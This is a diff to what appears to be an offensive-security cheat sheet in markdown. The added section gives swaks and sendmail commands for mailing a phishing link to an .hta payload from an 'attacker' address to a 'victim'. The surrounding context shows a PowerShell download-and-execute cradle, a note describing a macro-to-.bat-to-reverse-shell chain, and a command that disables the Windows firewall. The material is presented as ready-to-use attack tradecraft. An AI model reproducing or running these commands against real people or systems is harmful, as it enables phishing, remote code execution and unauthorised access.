@@ -615,6 +615,20 @@ $out = $null
 $string = $null}} else {cleanup}}
 ```
 
+
+## Deploy
+```
+swaks --body 'click me http://192.168.X.X/file.hta' --add-header
+"Really: 1.0" --add-header "Content-Type: text/html" --header
+"Subject: Important" -t victim@corp.com -f attacker@corp.com --server
+192.168.X.X
+```
+<br>
+
+ ```
+ sendmail -f attacker@email.com -t victim@email.com -s 192.168.x.x -u "Subject" -m "body"
+```
+
 ## Bringing it home
 
 - ### Save file as .bat and host on your server
@@ -627,6 +641,8 @@ powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('h
 When the macro is clicked it will first download the .bat file and execute.
 Then the .bat file will download and execute your .txt file resulting in a revshell
 ```
+
+
 
 # Powershell
 <br>
@@ -788,11 +804,6 @@ NetSh Advfirewall set allprofiles state off
  stty raw -echo && fg
  reset
  ```
- 
- ### Sendmail:
- ```
- sendmail -f attacker@email.com -t victim@email.com -s 192.168.x.x -u "Subject" -m "body"
-```
 <br>
 <br>
 
